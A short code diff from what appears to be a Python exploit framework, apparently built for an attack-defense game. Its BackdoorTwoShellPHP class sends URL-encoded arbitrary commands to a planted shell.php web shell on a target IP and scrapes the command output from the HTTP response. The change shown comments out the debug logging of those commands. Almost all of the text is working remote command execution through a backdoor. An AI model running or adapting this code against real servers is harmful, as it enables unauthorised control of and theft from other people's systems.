@@ -13,7 +13,7 @@ class BackdoorTwoShellPHP(Exploit):
 		super().__init__(ip_address=ip_address, parsed_config=parsed_config)
 
 	def run_custom_command(self, command):
-		logger.debug(f"{self.ip_address} - Running command `{command}`...")
+		# logger.debug(f"{self.ip_address} - Running command `{command}`...")
 		http_encoded_command_to_run = urllib.parse.quote(command.encode('utf8'))
 		server_response = requests.get(f"http://{self.ip_address}/arbitrary_file_upload/images/shell.php?cmd={http_encoded_command_to_run}", timeout=3)
 		server_status_code = server_response.status_code
@@ -21,7 +21,7 @@ class BackdoorTwoShellPHP(Exploit):
 			raise PatchedException(f"{self.ip_address} - Server responded with status code `{server_status_code}` which means the user patched this by removing `shell.php`")
 		server_response_text = server_response.text
 		command_output = server_response_text.split(f"{command}\n")[1].split("</body>")[0].rstrip()
-		logger.debug(f"{self.ip_address} - Command returned `{command_output}`.")
+		# logger.debug(f"{self.ip_address} - Command returned `{command_output}`.")
 		return command_output
 
 	def test_if_vulnerable(self):
